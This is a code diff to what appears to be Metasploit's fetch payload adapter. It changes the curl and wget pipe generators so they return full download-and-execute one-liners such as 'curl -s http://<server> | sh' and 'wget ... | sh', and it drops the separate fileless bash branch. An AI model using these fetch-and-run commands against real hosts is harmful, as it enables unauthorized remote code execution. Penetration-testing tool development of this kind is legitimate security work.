@@ -87,14 +87,10 @@ module Msf::Payload::Adapter::Fetch
     opts[:code] = super
     @srvexe = generate_payload_exe(opts)
     if datastore['FETCH_PIPE']
-      @pipe_cmd = '(' + generate_fetch_commands + ')'
-      vprint_status(@pipe_cmd)
+      @pipe_cmd = generate_fetch_commands
+      vprint_status("Command served: #{@pipe_cmd}")
       cmd = generate_pipe_command
-      if datastore['FETCH_FILELESS']
-        cmd << 'bash'
-      else
-        cmd << 'sh'
-      end    else
+    else
       cmd = generate_fetch_commands
     end
     vprint_status("Command to run on remote host: #{cmd}")
@@ -313,11 +309,11 @@ module Msf::Payload::Adapter::Fetch
   def _generate_curl_pipe
     case fetch_protocol
     when 'HTTP'
-      pipe_cmd = "curl -s http://#{_download_pipe} | "
+      return "curl -s http://#{_download_pipe} | sh"
     when 'HTTPS'
-      pipe_cmd = "curl -sk https://#{_download_pipe} | "
+      return "curl -sk https://#{_download_pipe} | sh"
     when 'TFTP'
-      pipe_cmd = "curl -s tftp://#{_download_pipe} | "
+      return "curl -s tftp://#{_download_pipe} | sh"
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported Binary Selected')
     end
@@ -387,9 +383,9 @@ module Msf::Payload::Adapter::Fetch
   def _generate_wget_pipe
     case fetch_protocol
     when 'HTTPS'
-      return "wget --no-check-certificate -qO - https://#{_download_pipe} | "
+      return "wget --no-check-certificate -qO - https://#{_download_pipe} | sh"
     when 'HTTP'
-      return "wget -qO - http://#{_download_pipe} | "
+      return "wget -qO - http://#{_download_pipe} | sh"
     else
       return nil
     end
